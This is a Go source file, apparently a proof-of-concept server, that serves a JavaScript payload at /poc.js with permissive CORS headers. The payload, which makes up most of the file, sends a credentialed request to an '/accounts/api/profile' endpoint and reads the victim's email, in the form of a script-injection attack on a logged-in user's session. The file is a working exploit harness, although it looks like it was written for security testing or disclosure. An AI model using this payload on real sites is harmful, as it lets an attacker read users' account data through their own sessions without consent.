package main

import (
	"io"
	"log"
	"net/http"
)

const payload = `const xhr = new XMLHttpRequest();
var res = '';
xhr.open('GET', '/accounts/api/profile');
xhr.responseType = 'json';
xhr.withCredentials = true;
xhr.onload = function(e) {
    if (this.status == 200) {
        res = JSON.parse((JSON.stringify(xhr.response)));
        console.log(res.email)
    }
};
xhr.send();`

func handle() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("content-type", "application/javascript")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}

		w.WriteHeader(http.StatusOK)
		io.WriteString(w, payload)
	}
}

func index() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}
}

func main() {
	http.HandleFunc("/poc.js", handle())
	http.HandleFunc("/", index())
	if err := http.ListenAndServe(":3000", nil); err != nil {
		log.Fatal(err)
	}
}
